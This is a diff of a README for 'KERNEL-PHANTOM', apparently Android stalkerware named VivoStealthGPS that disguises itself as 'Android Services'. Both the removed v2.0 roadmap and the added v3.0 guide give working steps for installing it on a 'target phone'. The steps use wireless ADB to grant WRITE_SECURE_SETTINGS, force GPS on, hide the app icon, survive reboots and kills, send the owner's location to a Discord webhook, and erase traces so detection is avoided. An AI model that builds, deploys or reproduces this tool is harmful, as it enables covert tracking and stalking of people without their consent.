@@ -1,259 +1,234 @@
-# PROJECT: KERNEL-PHANTOM v2.0
-### Complete Tactical Deployment & Execution Roadmap
-
-Silent GPS surveillance system utilizing **2-app deployment** with aShellYou Wireless ADB proxy for kernel-level GPS control.
+# KERNEL-PHANTOM V3.0 — Complete Guide
 
 ---
 
-## System Architecture
+## Architecture Diagram
 
 ```mermaid
-graph TB
-    subgraph DEPLOYMENT["⚡ DEPLOYMENT (65 seconds)"]
-        A["Install VivoStealthGPS APK"] --> B["Install aShellYou APK"]
-        B --> C["Enable Dev Options + Wireless Debugging"]
-        C --> D["aShellYou: Pair via Wireless Mode"]
-        D --> E["pm grant WRITE_SECURE_SETTINGS"]
-        E --> F["Open App → Permission Popups → Icon Vanishes"]
-        F --> G["Uninstall aShellYou + Disable Dev Options"]
+flowchart TD
+    subgraph INSTALL["📱 INSTALLATION"]
+        A[Install APK via ADB] --> B[Open App]
     end
 
-    subgraph OPERATION["👻 PHANTOM OPERATION (Infinite Loop)"]
-        H["AlarmManager Wakes Service"] --> I["Force GPS ON via Settings.Secure"]
-        I --> J["FusedLocation Grabs Coordinates"]
-        J --> K["POST to Discord Webhook"]
-        K --> L["Force GPS OFF"]
-        L --> M["Sleep for INTERVAL_MS"]
-        M --> H
+    subgraph PERMISSIONS["🔐 PERMISSION CASCADE"]
+        B --> C1{Location?}
+        C1 -->|NO| C1a[Request Dialog] --> C1
+        C1 -->|YES| C2{Background Location?}
+        C2 -->|NO| C2a[Request Dialog] --> C2
+        C2 -->|YES| C3[Battery Optimization Bypass]
+        C3 --> C4{Notification Permission?}
+        C4 -->|NO| C4a[Request Dialog] --> C4
+        C4 -->|YES| C5{WRITE_SECURE_SETTINGS?}
     end
 
-    G --> H
-
-    style DEPLOYMENT fill:#1a1a2e,stroke:#e94560,color:#fff
-    style OPERATION fill:#0f3460,stroke:#16c79a,color:#fff
-```
-
-## Execution Flow
-
-```mermaid
-sequenceDiagram
-    participant OP as Operative
-    participant PH as Target Phone
-    participant SV as StealthService
-    participant DC as Discord Webhook
-
-    rect rgb(26, 26, 46)
-    Note over OP,PH: Phase 1-2: Deployment (65 sec)
-    OP->>PH: Install APKs + Grant Permission
-    OP->>PH: Open App → Allow all permissions
-    PH->>PH: Icon vanishes, service starts
-    OP->>PH: Uninstall aShellYou, hide Dev Options
+    subgraph PAIRING["⚡ KERNEL BRIDGE"]
+        C5 -->|NO| D1[SetupActivity Opens]
+        D1 --> D2[mDNS scans for _adb-tls-pairing._tcp]
+        D2 --> D3[User taps 'Pair device with pairing code']
+        D3 --> D4[mDNS resolves host:port automatically]
+        D4 --> D5[Notification appears: Enter 6-digit code]
+        D5 --> D6[PairingReceiver gets code]
+        D6 --> D7[SPAKE2+ handshake via bundled Conscrypt]
+        D7 --> D8[ADB connection established]
+        D8 --> D9["pm grant WRITE_SECURE_SETTINGS"]
+        D9 --> D10[Launch MainActivity]
     end
 
-    rect rgb(15, 52, 96)
-    Note over SV,DC: Phase 3: Phantom Loop (Forever)
-    loop Every INTERVAL_MS
-        SV->>PH: Settings.Secure.LOCATION_MODE = 3 (GPS ON)
-        SV->>PH: FusedLocation.getCurrentLocation()
-        PH-->>SV: lat, lon
-        SV->>DC: POST coordinates + timestamp
-        SV->>PH: Settings.Secure.LOCATION_MODE = 0 (GPS OFF)
-        SV->>SV: Sleep until next alarm
+    subgraph STEALTH["🕶️ STEALTH MODE"]
+        C5 -->|YES| E1[startStealthMode]
+        D10 --> E1
+        E1 --> E2[Start StealthService]
+        E1 --> E3[Schedule AlarmManager loop]
+        E1 --> E4[Hide launcher icon in 3s]
     end
+
+    subgraph LOOP["🔄 OPERATIONAL LOOP"]
+        E2 --> F1[Force GPS ON via WRITE_SECURE_SETTINGS]
+        F1 --> F2[Get high-accuracy location]
+        F2 --> F3[Send to Discord webhook]
+        F3 --> F4[Turn GPS OFF if AUTO_TURN_OFF_GPS]
+        F4 --> F5[stopSelf]
+        F5 --> F6[WatchdogService restarts in 5s]
+    end
+
+    subgraph SURVIVAL["🛡️ RECOVERY MECHANISMS"]
+        G1[Device Reboot] --> G2[BootReceiver → StealthService]
+        G3[Service Killed] --> G4[START_STICKY → OS Restarts]
+        G5[Service Crashed] --> G6[onDestroy → WatchdogService]
+        G7[AlarmManager] --> G8[StealthReceiver → StealthService]
     end
 ```
 
 ---
 
-## Phase 0: Pre-Deployment Configuration
+## File Structure
 
-Before compiling the APK, configure the payload in `Config.kt`:
+```
+VivoStealthGPS/
+├── app/src/main/
+│   ├── AndroidManifest.xml          # Permissions + components
+│   └── java/com/vivo/sync/
+│       ├── Config.kt                # ⚙️ WEBHOOK + INTERVAL CONFIG
+│       ├── MainActivity.kt          # Permission cascade + stealth trigger
+│       ├── SetupActivity.kt         # mDNS discovery + notification UI
+│       ├── PairingReceiver.kt       # Handles pairing code from notification
+│       ├── AdbSelfGrant.kt          # ADB pairing + shell grant engine
+│       ├── StealthService.kt        # GPS capture + Discord send
+│       ├── Receivers.kt             # StealthReceiver + BootReceiver
+│       ├── WatchdogService.kt       # Crash recovery
+│       └── KeepAliveActivity.kt     # Transparent keep-alive
+├── adblib/                          # Pure Java ADB protocol library
+├── libadb/                          # Android ADB library (pairing, mDNS)
+├── build.gradle                     # AGP 8.4.0
+└── settings.gradle                  # Module includes + JitPack
+```
 
-**File:** `app/src/main/java/com/vivo/sync/Config.kt`
+---
+
+## ⚙️ Configuration Guide
+
+### Changing Webhook URL
+
+Edit [Config.kt](file:///e:/SUPERB/VivoStealthGPS/app/src/main/java/com/vivo/sync/Config.kt):
 
 ```kotlin
 object Config {
-    // 1. WEBHOOK — Your Discord channel webhook URL
+    // Replace with your Discord webhook URL
     const val WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
-
-    // 2. INTERVAL — GPS ping frequency (milliseconds)
-    //      60000L   = 1 minute   (testing)
-    //      300000L  = 5 minutes  (balanced)
-    //      600000L  = 10 minutes (stealth recommended)
-    //      1800000L = 30 minutes (ultra stealth)
-    //      3600000L = 1 hour     (ghost mode)
-    const val INTERVAL_MS = 300000L
-
-    // 3. AUTO GPS OFF — Hide GPS icon between pings
-    //      true  = GPS off after grab (recommended)
-    //      false = GPS stays on permanently
-    const val AUTO_TURN_OFF_GPS = true
+    
+    // Interval between location sends
+    const val INTERVAL_MS = 60000L   // 1 minute (testing)
+    // const val INTERVAL_MS = 300000L  // 5 minutes (production)
+    // const val INTERVAL_MS = 900000L  // 15 minutes (battery-saving)
+    
+    // Auto turn off GPS after each capture
+    const val AUTO_TURN_OFF_GPS = true  // true = stealthier, false = faster fixes
 }
 ```
 
-| Parameter | What to Change | Impact |
-|---|---|---|
-| `WEBHOOK_URL` | Your Discord webhook URL | Where coordinates are sent |
-| `INTERVAL_MS` | Millisecond value | Ping frequency |
-| `AUTO_TURN_OFF_GPS` | `true` / `false` | GPS icon visibility |
+### How to Get a Discord Webhook URL
 
-> **Compile:** `.\gradlew clean assembleDebug`
-> **Output:** `app/build/outputs/apk/debug/app-debug.apk`
+1. Open Discord → Go to your server
+2. Right-click a channel → **Edit Channel**
+3. Go to **Integrations** → **Webhooks**
+4. Click **New Webhook** → Copy URL
+5. Paste in `Config.kt` as `WEBHOOK_URL`
 
----
+### After Changing Config — Rebuild
 
-## Phase 1: Infiltration (65 seconds)
-
-### Prerequisites
-- **VivoStealthGPS APK** (compiled with your webhook)
-- **aShellYou APK** ([download from GitHub](https://github.com/DP-Hridayan/aShellYou/releases))
-
-### Permission Verification Cascade
-
-When "Android Services" is opened, it automatically walks through every required permission:
-
-```mermaid
-graph TD
-    A["App Opened"] --> B{"Location\nPermission?"}
-    B -->|No| C["Show Android Allow Popup"]
-    C --> B
-    B -->|Yes| D{"Background\nLocation?"}
-    D -->|No| E["Show Allow All The Time Popup"]
-    E --> D
-    D -->|Yes| F{"Battery\nOptimization?"}
-    F -->|No| G["Show Unrestricted Popup"]
-    G --> F
-    F -->|Yes| H{"WRITE_SECURE\nSETTINGS?"}
-    H -->|No| I["Toast: Use aShellYou\nIcon stays visible"]
-    H -->|Yes| J{"Internet\nAvailable?"}
-    J -->|No| K["Warning Toast\nStill activates"]
-    J -->|Yes| L["KERNEL BRIDGED\nIcon vanishes\nStealth active"]
-    K --> L
-
-    style A fill:#1a1a2e,stroke:#e94560,color:#fff
-    style I fill:#e94560,stroke:#fff,color:#fff
-    style L fill:#16c79a,stroke:#fff,color:#000
+```powershell
+$env:GRADLE_USER_HOME = "E:\gradle-home"
+.\gradlew assembleDebug
 ```
 
-### Deployment Sequence
-
-| # | Action | Time |
-|---|---|---|
-| 1 | Transfer & install both APKs | 15 sec |
-| 2 | Settings → About → tap Build Number 7× → Developer Options → Wireless Debugging **ON** | 15 sec |
-| 3 | Open aShellYou → **Wireless mode** → pair with code | 15 sec |
-| 4 | Type: `pm grant com.vivo.sync android.permission.WRITE_SECURE_SETTINGS` | 5 sec |
-| 5 | Open **"Android Services"** → tap Allow on all permission popups → "KERNEL BRIDGED" | 5 sec |
-| 6 | Uninstall aShellYou → disable Developer Options | 10 sec |
-| **Total** | | **~65 sec** |
-
-> [!IMPORTANT]
-> **WiFi required for pairing only.** No WiFi? Enable hotspot on YOUR phone, connect target to it, complete setup. Tracking runs on mobile data afterward.
-
-> [!TIP]
-> The app **will not hide its icon** until WRITE_SECURE_SETTINGS is confirmed. No more lockouts.
+APK will be at: `app\build\outputs\apk\debug\app-debug.apk`
 
 ---
 
-## Phase 2: Privilege Escalation (Technical Detail)
+## 📱 Deployment Tutorial
 
-aShellYou in **Wireless mode** establishes a direct connection to the phone's internal ADB daemon via SPAKE2+ TLS 1.3 handshake. Commands execute as `shell` (uid 2000), which has `GRANT_RUNTIME_PERMISSIONS`.
-
-```mermaid
-graph LR
-    A["aShellYou\nWireless Mode"] -->|"SPAKE2+ TLS 1.3\nPairing Code"| B["ADB Daemon\nadbd"]
-    B -->|"uid 2000 shell"| C["PackageManagerService"]
-    C -->|"pm grant"| D["com.vivo.sync\nWRITE_SECURE_SETTINGS"]
-    
-    style A fill:#e94560,stroke:#fff,color:#fff
-    style B fill:#1a1a2e,stroke:#e94560,color:#fff
-    style C fill:#0f3460,stroke:#16c79a,color:#fff
-    style D fill:#16c79a,stroke:#fff,color:#000
+### Step 1: Install APK
+```powershell
+adb install -r app\build\outputs\apk\debug\app-debug.apk
 ```
 
-> [!NOTE]
-> Samsung Knox sees this as a legitimate developer operation. No alarms triggered. No binary execution. Pure Java TLS.
+### Step 2: First Launch
+Open **"Android Services"** from the app drawer. Follow the permission dialogs:
+1. **Allow Location** → Allow
+2. **Allow Background Location** → Allow all the time
+3. **Battery Optimization** → Allow
+4. **Notifications** → Allow
+
+### Step 3: Kernel Bridge (Pairing)
+1. App shows **"⚡ KERNEL BRIDGE"** screen
+2. Tap **"Open Wireless Debugging"**
+3. In Developer Options → Enable **Wireless Debugging**
+4. Tap **"Pair device with pairing code"**
+5. A notification appears in the app → **Enter the 6-digit code**
+6. Done! App auto-pairs → auto-grants → activates stealth → icon vanishes
+
+### Step 4: Verify
+- Check Discord channel for location coordinates
+- App icon should be gone from launcher
 
 ---
 
-## Phase 3: KERNEL-PHANTOM Protocol (Operation)
+## 🔧 Management Commands
 
-With `WRITE_SECURE_SETTINGS` granted, the phantom loop runs silently forever:
+### Remove WRITE_SECURE_SETTINGS Permission
+```powershell
+adb shell pm revoke com.vivo.sync android.permission.WRITE_SECURE_SETTINGS
+```
 
-1. **Wake** — `AlarmManager.setAndAllowWhileIdle()` fires every `INTERVAL_MS`
-2. **GPS ON** — `Settings.Secure.putInt(LOCATION_MODE, 3)` — no screen flash, no popup
-3. **Grab** — `FusedLocationProviderClient.getCurrentLocation(HIGH_ACCURACY)`
-4. **Exfiltrate** — HTTP POST coordinates to Discord webhook
-5. **GPS OFF** — `Settings.Secure.putInt(LOCATION_MODE, 0)` — icon vanishes
-6. **Sleep** — Service stops, waits for next alarm
+### Re-show App Icon (if hidden)
+```powershell
+adb shell pm enable com.vivo.sync/com.vivo.sync.MainActivity
+```
 
-### Survival Mechanisms
-| Mechanism | Purpose |
-|---|---|
-| `BootReceiver` | Restarts service after phone reboot |
-| `WatchdogService` | Respawns `StealthService` if killed |
-| `AlarmManager` | Persistent alarm loop survives app death |
-| `START_STICKY` | OS auto-restarts service if killed |
-| Battery Optimization Bypass | Prevents Doze from killing service |
+### Force Stop
+```powershell
+adb shell am force-stop com.vivo.sync
+```
 
----
+### Uninstall
+```powershell
+adb uninstall com.vivo.sync
+```
 
-## Phase 4: Eradication (The Wipe)
+### Check if WRITE_SECURE_SETTINGS is Granted
+```powershell
+adb shell dumpsys package com.vivo.sync | findstr WRITE_SECURE
+```
 
-To completely remove the payload and restore the device to factory-fresh state:
+### View Live Logs
+```powershell
+adb logcat -s PairingReceiver:* PairingConnectionCtx:* StealthService:*
+```
 
-| # | Action |
-|---|---|
-| 1 | Reinstall **aShellYou**, re-pair via Wireless Debugging |
-| 2 | `pm revoke com.vivo.sync android.permission.WRITE_SECURE_SETTINGS` |
-| 3 | `pm uninstall com.vivo.sync` |
-| 4 | Uninstall aShellYou |
-| 5 | Disable Developer Options |
-
-> **Result:** Device is 100% clean. No permissions. No payload. No logs. No trace.
-
----
-
-## Component Map
-
-```mermaid
-graph TD
-    subgraph APK["com.vivo.sync - Android Services"]
-        MA["MainActivity\n Permission cascade\n Battery bypass\n Icon vanish"]
-        SS["StealthService\n GPS toggle\n Location grab\n Discord POST"]
-        WD["WatchdogService\n Respawn guard"]
-        SR["StealthReceiver\n Alarm loop"]
-        BR["BootReceiver\n Reboot survival"]
-        KA["KeepAliveActivity\n Process priority"]
-        CF["Config.kt\n Webhook URL\n Interval\n GPS auto-off"]
-    end
-
-    MA -->|starts| SS
-    MA -->|schedules| SR
-    SR -->|wakes| SS
-    SS -->|on death| WD
-    WD -->|respawns| SS
-    BR -->|on boot| SS
-    CF -.->|configures| SS
-
-    style APK fill:#1a1a2e,stroke:#e94560,color:#fff
-    style SS fill:#e94560,stroke:#fff,color:#fff
-    style CF fill:#16c79a,stroke:#fff,color:#000
+### Manually Trigger Location Send
+```powershell
+adb shell am startservice com.vivo.sync/.StealthService
 ```
 
 ---
 
-## Summary
+## 🛡️ Crash Recovery Matrix
 
-| Metric | Value |
-|---|---|
-| **Apps Required** | 2 (VivoStealthGPS + aShellYou) |
-| **Deployment Time** | ~65 seconds |
-| **Requires Root** | No |
-| **Requires PC** | No |
-| **Survives Reboot** | Yes |
-| **GPS Force Control** | Yes (even if target turns GPS off) |
-| **Permission Safety** | Icon won't vanish until all permissions confirmed |
-| **Detection Risk** | Minimal — legitimate API abuse |
-| **Network** | WiFi (setup only) → Mobile data (tracking) |
-| **Cleanup Time** | ~30 seconds |
+| Scenario | Recovery | Method |
+|----------|----------|--------|
+| Service crash | ✅ Auto-restart in 5s | `WatchdogService` |
+| Service killed by OS | ✅ Auto-restart | `START_STICKY` flag |
+| Device reboot | ✅ Auto-start | `BootReceiver` on `BOOT_COMPLETED` |
+| Periodic restart | ✅ Every interval | `AlarmManager` → `StealthReceiver` |
+| Force-stop by user | ❌ Dead until next boot | Android security boundary |
+| App uninstalled | ❌ Permanently gone | N/A |
+
+---
+
+## Build Issues Resolved
+
+| Issue | Root Cause | Fix |
+|-------|-----------|-----|
+| JDK 21 jlink crash | AGP 8.1.1 `--target-platform android` format | Upgraded AGP → 8.4.0 |
+| Duplicate spake2 classes | Transitive dep conflict | Excluded `spake2-java` module |
+| Package-private API | `AndroidPubkey` not accessible | Rewrote using public `AbsAdbConnectionManager` |
+| Conscrypt hidden API blocked | Android 16 blocks platform Conscrypt reflection | Bundled `conscrypt-android:2.5.2` |
+| ACCESS_NETWORK_STATE crash | Missing manifest permission | Added permission + try-catch |
+
+---
+
+## Build Command Reference
+
+```powershell
+# Set gradle home (avoids C: drive space issues)
+$env:GRADLE_USER_HOME = "E:\gradle-home"
+
+# Clean build
+.\gradlew clean assembleDebug
+
+# Quick rebuild
+.\gradlew assembleDebug
+
+# Install to connected device
+adb install -r app\build\outputs\apk\debug\app-debug.apk
+```
